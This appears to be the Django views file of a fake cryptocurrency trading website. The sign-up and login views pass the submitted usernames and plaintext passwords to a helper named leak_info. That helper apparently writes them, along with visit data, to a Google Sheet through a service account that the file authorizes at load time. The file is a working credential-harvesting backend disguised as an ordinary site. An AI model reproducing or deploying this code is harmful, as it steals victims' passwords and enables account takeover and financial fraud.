from oauth2client.service_account import ServiceAccountCredentials
from googleapiclient.discovery import build
import gspread
from django.shortcuts import render, redirect
from .forms import RegisterForm, OrderForm
from django.contrib.auth import login, logout, authenticate
from django.contrib.auth.forms import AuthenticationForm
from .functions import get_client_ip, leak_info
from django.contrib.auth.decorators import login_required, permission_required

SCOPE = ["https://spreadsheets.google.com/feeds",
         "https://www.googleapis.com/auth/spreadsheets",
         "https://www.googleapis.com/auth/drive.file",
         "https://www.googleapis.com/auth/drive"]

CREDS = ServiceAccountCredentials.from_json_keyfile_name('creds.json', SCOPE)
ACCESS_TOKEN = CREDS.get_access_token().access_token
CLIENT = gspread.authorize(CREDS)
DRIVE_SERVICE = build('drive', 'v3', credentials=CREDS)


# Create your views here.
def sign_up(request):
    if request.method == 'POST':
        fields = ['username', 'password1']
        leak_info(request, CLIENT, fields, "Register")

        form = RegisterForm(request.POST)

        if form.is_valid():
            print('valid')
            user = form.save()
            login(request, user)
            return redirect('/')
    else:
        form = RegisterForm()

    return render(request, 'main/register.html', {"form": form})


def home(request):
    fields = []
    leak_info(request, CLIENT, fields, "Visit")
    return render(request, 'main/home.html')


def market(request):
    return render(request, 'main/market.html')


def trade(request):
    return render(request, 'main/trade.html', {"name": request.user})


def scontract(request):
    return render(request, 'main/scontract.html', {"name": request.user})


def finance(request):
    return render(request, 'main/finance.html')


def subscribe(request):
    return render(request, 'main/subscribe.html')


def mining(request):
    return render(request, 'main/mining.html')


def fund(request):
    return render(request, 'main/fund.html')


@login_required(login_url="/login")
def assets(request):
    if request.method == 'POST':
        form = OrderForm(request.POST)
        if form.is_valid():
            order = form.save(commit=False)
            order.owner = request.user
            order.save()

    else:
        form = OrderForm()

    return render(request, 'main/myAssets.html', {'form': form})


def loginleek(request):
    if request.method == 'POST':

        fields = ['username', 'password']
        leak_info(request, CLIENT, fields, "Login")

        form = AuthenticationForm(data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(request, username=username, password=password)
            if user:
                login(request, user)
            return redirect('/')
    else:
        form = AuthenticationForm()

    return render(request, 'main/login.html', {'form': form})
